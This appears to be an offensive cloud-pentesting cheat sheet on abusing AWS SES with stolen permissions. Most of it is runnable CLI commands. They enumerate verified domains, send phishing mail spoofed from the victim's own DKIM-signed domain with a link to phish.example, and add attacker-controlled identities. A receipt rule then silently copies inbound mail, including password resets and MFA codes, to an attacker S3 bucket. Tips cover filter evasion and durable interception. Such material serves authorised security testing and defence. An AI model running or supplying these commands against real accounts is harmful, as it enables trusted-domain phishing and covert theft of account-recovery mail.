---
title: "SES: phishing and spoofed mail from a trusted domain"
description: "Abusing SES to send phishing and spoofed mail from a trusted domain, and reading verified identities and sending quotas."
keywords:
  - SES
  - email
  - phishing
  - spoofing
  - verified identity
---

# SES

Simple Email Service sends mail from the account's **verified identities**, domains and addresses that already pass SPF, DKIM, and DMARC because the victim set them up. With `ses:SendEmail` (or `ses:SendRawEmail`) you send mail that is cryptographically aligned with a trusted domain, which is a far stronger phishing position than any look-alike you could register, and you inherit the account's warmed sending reputation and quota.

## Finding what you can send as

```bash
aws ses list-identities --identity-type Domain        # verified domains
aws ses get-identity-verification-attributes --identities example.com
aws ses get-send-quota                                 # daily cap and send rate
aws sesv2 get-account                                  # sending enabled, reputation
```

A verified domain with DKIM enabled is the prize: mail from it aligns for DMARC.

## Sending as the victim

```bash
aws ses send-email \
  --from "it-support@example.com" \
  --destination "ToAddresses=target@example.com" \
  --message 'Subject={Data=Action required},Body={Html={Data=<a href=https://phish.example>reset</a>}}'

# raw MIME for full header control (display name, Reply-To, attachments)
aws ses send-raw-email --raw-message Data=fileb://phish.eml
```

## Verifying your own identity

If the account can verify identities, add one you control to widen what you can send as and to seed a reply path:

```bash
aws ses verify-email-identity --email-address collect@you.example
aws ses verify-domain-identity --domain you.example     # returns a TXT token to publish
```

## Intercepting inbound mail

Where the domain receives mail through SES, a **receipt rule** files incoming messages to a destination you control, which turns the account into a mailbox tap for password resets and MFA mail:

```bash
aws ses list-receipt-rule-sets ; aws ses describe-active-receipt-rule-set
# add a rule that copies inbound mail to an attacker S3 bucket (or Lambda/SNS)
aws ses create-receipt-rule --rule-set-name <active-set> \
  --rule 'Name=tap,Enabled=true,Recipients=[target@example.com],Actions=[{S3Action={BucketName=<attacker-bucket>}}]'
```

## Exploitation notes

- Mail leaves from AWS sending IPs with valid DKIM for the domain, so it clears the filters that block spoofed external senders.
- An inbound receipt rule is durable interception: it keeps capturing mail (including account-recovery and MFA messages) until an operator audits the rule set.
- `ses:SendRawEmail` gives full MIME control; set a plausible `Reply-To` you own to collect responses.
- If the account is still in the SES sandbox, sending is limited to verified recipients; check `get-account` and pivot to a production-mode account if sandboxed.
- Authorization policies on an identity (`ses:SendEmail` granted cross-account) can let a foothold in one account send as another's domain.

## Tools

- **AWS CLI** (`ses send-email` / `send-raw-email`): sending.
- **Pacu** (`ses__enum`): enumerate identities and sending state.

## References

- [HackTricks Cloud: AWS SES abuse](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ses-enum.html)
- [AWS: SES send-email API](https://docs.aws.amazon.com/ses/latest/APIReference/API_SendEmail.html)
- [Rhino Security Labs: phishing with Amazon SES](https://rhinosecuritylabs.com/aws/)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
